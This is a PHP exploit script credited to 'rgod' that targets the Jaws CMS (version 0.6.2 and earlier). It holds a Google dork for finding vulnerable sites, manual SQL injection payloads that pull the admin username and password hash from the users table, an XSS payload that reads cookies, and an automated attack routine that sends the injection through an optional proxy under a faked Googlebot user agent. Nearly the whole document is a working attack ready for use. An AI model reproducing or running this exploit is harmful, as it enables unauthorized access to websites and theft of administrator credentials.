#!/usr/bin/php -q -d short_open_tag=on&lt;?echo &quot;Jaws &lt;= 0.6.2 &#039;Search gadget&#039; SQL injection / admin credentials disclosure\r\n&quot;;echo &quot;by rgod rgod@autistici.org\r\n&quot;;echo &quot;site: http://retrogod.altervista.org\r\n&quot;;echo &quot;dork: \&quot;powered by jaws\&quot; | \&quot;powered by the jaws project\&quot; | inurl:?gadget=search\r\n\r\n&quot;;/*works regardless of php.ini settingsif &#039;Search gadget&#039; is enabled*/if ($argc&lt;3) {echo &quot;Usage: php &quot;.$argv[0].&quot; host path OPTIONS\r\n&quot;;echo &quot;host:      target server (ip/hostname)\r\n&quot;;echo &quot;path:      path to jaws\r\n&quot;;echo &quot;Options:\r\n&quot;;echo &quot;   -T[prefix]   specify a table prefix different from default (no prefix)\r\n&quot;;echo &quot;                try blog_ even\r\n&quot;;echo &quot;   -p[port]:    specify a port other than 80\r\n&quot;;echo &quot;   -P[ip:port]: specify a proxy\r\n&quot;;echo &quot;Example:\r\n&quot;;echo &quot;php &quot;.$argv[0].&quot; localhost /jaws/ \r\n&quot;;echo &quot;php &quot;.$argv[0].&quot; localhost /jaws/ -Tblog_\r\n&quot;;die;}# software site: http://www.jaws-project.com/# manual exploitation:## i)sql injection:#   go to http://[target]/[path_to_jaws]/?gadget=Search#   if search module is enabled, in search field type:##   1%&#039;)/**/UNION/**/SELECT/**/0,passwd,username,0,0/**/FROM/**/users/**/WHERE/**/id=1/*##   or@#   1%&#039;)/**/UNION/**/SELECT/**/0,passwd,username,0,0/**/FROM/**/blog_users/**/WHERE/**/id=1/*##   now at screen you have admin username &amp; password hash#   this works with magic_quotes_gpc both on &amp; off## ii)xss:#    http://[target]/[path_to_jaws]/gadgets/RssReader/extras/magpierss/scripts/magpie_slashbox.php?rss_url=&lt;script&gt;alert(document.cookie)&lt;/script&gt;error_reporting(0);ini_set(&quot;max_execution_time&quot;,0);ini_set(&quot;default_socket_timeout&quot;,5);function quick_dump($string){  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;  for ($i=0; $i&lt;=strlen($string)-1; $i++)  {   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))   {$result.=&quot;  .&quot;;}   else   {$result.=&quot;  &quot;.$string[$i];}   if (strlen(dechex(ord($string[$i])))==2)   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}   else   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}  } return $exa.&quot;\r\n&quot;.$result;}$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;function sendpacketii($packet){  global $proxy, $host, $port, $html, $proxy_regex;  if ($proxy==&#039;&#039;) {    $ock=fsockopen(gethostbyname($host),$port);    if (!$ock) {      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;    }  }  else {   $c = preg_match($proxy_regex,$proxy);    if (!$c) {      echo &#039;Not a valid proxy...&#039;;die;    }    $parts=explode(&#039;:&#039;,$proxy);    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;    $ock=fsockopen($parts[0],$parts[1]);    if (!$ock) {      echo &#039;No response from proxy...&#039;;die;   }  }  fputs($ock,$packet);  if ($proxy==&#039;&#039;) {    $html=&#039;&#039;;    while (!feof($ock)) {      $html.=fgets($ock);    }  }  else {    $html=&#039;&#039;;    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {      $html.=fread($ock,1);    }  }  fclose($ock);  #debug  #echo &quot;\r\n&quot;.$html;}function is_hash($hash){ if (ereg(&quot;^[a-f0-9]{32}&quot;,trim($hash))) {return true;} else {return false;}}$host=$argv[1];$path=$argv[2];$port=80;$prefix=&quot;&quot;;$proxy=&quot;&quot;;for ($i=3; $i&lt;=$argc-1; $i++){$temp=$argv[$i][0].$argv[$i][1];if ($temp==&quot;-p&quot;){  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);}if ($temp==&quot;-P&quot;){  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);}if ($temp==&quot;-T&quot;){  $prefix=str_replace(&quot;-T&quot;,&quot;&quot;,$argv[$i]);}}if (($path[0]&lt;&gt;&#039;/&#039;) or ($path[strlen($path)-1]&lt;&gt;&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}$sql=&quot;1%&#039;)/**/UNION/**/SELECT/**/0,CONCAT(&#039;*SUNTZU*&#039;,passwd,&#039;*SUNTZU*&#039;),CONCAT(&#039;*SUNTZOI*&#039;,username,&#039;*SUNTZOI*&#039;),0,0/**/FROM/**/&quot;.$prefix.&quot;users/**/WHERE/**/id=1/*&quot;;$sql=urlencode($sql);$data=&quot;gadget=Search&quot;;$data.=&quot;&amp;action=Results&quot;;$data.=&quot;&amp;gadgets=All&quot;;$data.=&quot;&amp;searchdata=&quot;.$sql;$data.=&quot;&amp;searchButton=Search&quot;;$packet=&quot;POST &quot;.$p.&quot;index.php HTTP/1.0\r\n&quot;;$packet.=&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;$packet.=&quot;Accept-Encoding: text/plain\r\n&quot;;$packet.=&quot;User-Agent: Googlebot/2.1\r\n&quot;;$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;$packet.=&quot;Connection: Close\r\n\r\n&quot;;$packet.=$data;sendpacketii($packet);if (eregi(&quot;Gadget is not enabled&quot;,$html)){die(&quot;search gadget is not enabled... exploit failed&quot;);}$temp=explode(&#039;&quot;&gt;*SUNTZOI*&#039;,$html);$temp2=explode(&#039;*SUNTZOI*&#039;,$temp[1]);$admin=$temp2[0];$temp=explode(&#039;href=&quot;*SUNTZU*&#039;,$html);$temp2=explode(&#039;*SUNTZU*&#039;,$temp[1]);$hash=$temp2[0];if (($admin&lt;&gt;&#039;&#039;) and ($hash&lt;&gt;&#039;&#039;) and (is_hash($hash))){echo &quot;Exploit succeeded...\r\n&quot;;echo &quot;--------------------------------------------------------------------\r\n&quot;;echo &quot;admin          -&gt; &quot;.$admin.&quot;\r\n&quot;;echo &quot;password (md5) -&gt; &quot;.$hash.&quot;\r\n&quot;;echo &quot;--------------------------------------------------------------------\r\n&quot;;}else{echo &quot;Exploit failed, maybe wrong table prefix...&quot;;}?&gt;